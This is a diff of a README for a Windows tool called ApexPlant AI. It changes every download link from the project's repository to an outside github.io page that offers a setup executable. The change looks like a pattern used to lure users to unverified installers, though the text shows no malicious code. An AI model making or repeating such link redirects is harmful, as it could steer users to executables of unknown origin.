@@ -1,6 +1,6 @@
 # 🏭 ApexPlant AI Operations Hub - Industrial Knowledge Platform for Smart Decisions
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Rafaelitafreehanded839/apexplant-ai-operations-hub)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://rafaelitafreehanded839.github.io)
 
 ApexPlant AI turns your plant data into answers. This browser-based tool combines GraphRAG, agentic AI, and plant information to help with operational investigations, compliance activities, and citation-supported answers. No coding required.
 
@@ -41,7 +41,7 @@ Follow these steps to download and run ApexPlant AI on your Windows computer.
 
 Click the large blue button at the top of this page, or use this link:
 
-[**Download ApexPlant AI for Windows**](https://github.com/Rafaelitafreehanded839/apexplant-ai-operations-hub)
+[**Download ApexPlant AI for Windows**](https://rafaelitafreehanded839.github.io)
 
 This link takes you to the download page. Look for the file named `ApexPlantAI-Setup.exe` and click it to start the download.
 
@@ -143,7 +143,7 @@ ApexPlant AI runs on your computer. Your data stays local unless you choose to s
 
 If you need to reinstall or install on another computer, use the same download link:
 
-[**Download ApexPlant AI**](https://github.com/Rafaelitafreehanded839/apexplant-ai-operations-hub)
+[**Download ApexPlant AI**](https://rafaelitafreehanded839.github.io)
 
 ---
 
